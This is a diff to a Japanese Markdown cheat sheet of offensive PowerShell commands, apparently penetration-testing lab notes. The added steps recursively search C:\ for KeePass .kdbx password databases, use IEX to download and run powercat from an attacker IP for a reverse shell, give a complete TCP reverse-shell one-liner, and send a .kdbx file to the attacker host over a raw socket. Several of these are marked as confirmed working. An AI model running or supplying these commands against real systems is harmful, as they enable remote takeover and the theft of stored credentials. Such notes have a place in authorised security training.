@@ -37,5 +37,34 @@ $EncodedText
 
 6. ターゲット上でエンコードしたPowershellのリバースシェルコマンドをデコードさせて実行する
 ```.ps1
-powershell%20-enc%20<先ほどの出リョk素あれた$EncodedTextの内容>
+powershell%20-enc%20<先ほどの出力された$EncodedTextの内容>
 ```
+
+7. Windowsターゲット上で、C:\配下の全ファイルを列挙。このケースでは.kdbxの拡張子のファイルを列挙
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+8. Attackerマシンからpowercatを取得して実行し、リバースシェルを取る
+```
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/powercat.ps1');powercat -c 192.168.45.243 -p 4444 -e cmd"
+```
+
+9. 単純なリバースシェルコマンドで、コマンドプロンプトから実行させると動くのを確認済み
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
+10. Kali側でncを使ってデータをレシーブ状態にさせて、データをPowershell側から送信する。確認済み
+```
+$content = Get-Content 'Database.kdbx' -Raw
+$socket = New-Object System.Net.Sockets.TcpClient('192.168.45.243', 9999)
+$stream = $socket.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.Write($content)
+$writer.Flush()
+$writer.Close()
+$socket.Close()
+```
+
+
